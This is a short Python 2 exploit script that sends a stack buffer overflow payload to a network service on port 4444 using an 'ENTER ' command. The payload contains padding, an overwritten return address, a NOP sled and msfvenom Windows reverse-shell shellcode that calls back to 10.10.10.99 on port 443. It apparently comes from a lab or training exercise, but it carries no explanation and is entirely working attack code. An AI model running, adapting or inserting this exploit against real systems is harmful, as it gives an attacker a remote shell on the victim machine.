#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

#EIP Address=65626683
#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.99 LPORT=443 -f c -b "\x04\x05\x0d\x0e\x1f\x20\xda\xdb\xe0\xe1"
shellcode = ("\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x63\xbc"
"\xf8\x90\x83\xeb\xfc\xe2\xf4\x9f\x54\x7a\x90\x63\xbc\x98\x19"
"\x86\x8d\x38\xf4\xe8\xec\xc8\x1b\x31\xb0\x73\xc2\x77\x37\x8a"
"\xb8\x6c\x0b\xb2\xb6\x52\x43\x54\xac\x02\xc0\xfa\xbc\x43\x7d"
"\x37\x9d\x62\x7b\x1a\x62\x31\xeb\x73\xc2\x73\x37\xb2\xac\xe8"
"\xf0\xe9\xe8\x80\xf4\xf9\x41\x32\x37\xa1\xb0\x62\x6f\x73\xd9"
"\x7b\x5f\xc2\xd9\xe8\x88\x73\x91\xb5\x8d\x07\x3c\xa2\x73\xf5"
"\x91\xa4\x84\x18\xe5\x95\xbf\x85\x68\x58\xc1\xdc\xe5\x87\xe4"
"\x73\xc8\x47\xbd\x2b\xf6\xe8\xb0\xb3\x1b\x3b\xa0\xf9\x43\xe8"
"\xb8\x73\x91\xb3\x35\xbc\xb4\x47\xe7\xa3\xf1\x3a\xe6\xa9\x6f"
"\x83\xe3\xa7\xca\xe8\xae\x13\x1d\x3e\xd4\xcb\xa2\x63\xbc\x90"
"\xe7\x10\x8e\xa7\xc4\x0b\xf0\x8f\xb6\x64\x43\x2d\x28\xf3\xbd"
"\xf8\x90\x4a\x78\xac\xc0\x0b\x95\x78\xfb\x63\x43\x2d\xc0\x33"
"\xec\xa8\xd0\x33\xfc\xa8\xf8\x89\xb3\x27\x70\x9c\x69\x6f\xfa"
"\x66\xd4\x38\x38\x7b\xa3\x90\x92\x63\xbd\x43\x19\x85\xd6\xe8"
"\xc6\x34\xd4\x61\x35\x17\xdd\x07\x45\xe6\x7c\x8c\x9c\x9c\xf2"
"\xf0\xe5\x8f\xd4\x08\x25\xc1\xea\x07\x45\x0b\xdf\x95\xf4\x63"
"\x35\x1b\xc7\x34\xeb\xc9\x66\x09\xae\xa1\xc6\x81\x41\x9e\x57"
"\x27\x98\xc4\x91\x62\x31\xbc\xb4\x73\x7a\xf8\xd4\x37\xec\xae"
"\xc6\x35\xfa\xae\xde\x35\xea\xab\xc6\x0b\xc5\x34\xaf\xe5\x43"
"\x2d\x19\x83\xf2\xae\xd6\x9c\x8c\x90\x98\xe4\xa1\x98\x6f\xb6"
"\x07\x08\x25\xc1\xea\x90\x36\xf6\x01\x65\x6f\xb6\x80\xfe\xec"
"\x69\x3c\x03\x70\x16\xb9\x43\xd7\x70\xce\x97\xfa\x63\xef\x07"
"\x45")
cmd = "ENTER "
junk = "\x41" * 2029 + "\x83\x66\x62\x65" + "\x90"* 16 + shellcode + "C" * (3000-2029-4-346-16)
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4444))
s.send(buffer)
s.recv(1024)
s.close()
